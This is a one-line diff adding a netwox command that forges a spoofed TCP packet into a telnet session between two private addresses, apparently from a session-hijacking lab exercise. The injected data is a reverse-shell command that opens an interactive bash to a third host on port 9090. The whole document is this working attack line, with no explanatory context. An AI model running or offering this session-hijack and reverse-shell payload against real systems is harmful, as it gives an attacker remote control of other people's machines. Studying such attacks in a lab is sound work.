@@ -1,0 +1,1 @@
+sudo netwox 40 --ip4-dontfrag --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 172.16.46.131 --ip4-dst 172.16.46.130 --ip4-opt "" --tcp-src 52230 --tcp-dst 23 --tcp-seqnum 1412070267 --tcp-acknum 4059770906 --tcp-ack --tcp-psh   --tcp-window 237 --tcp-opt "" --tcp-data "'/bin/bash -i > /dev/tcp/192.168.2.8/9090 0<&1 2>&1'0d0a" --spoofip "best"
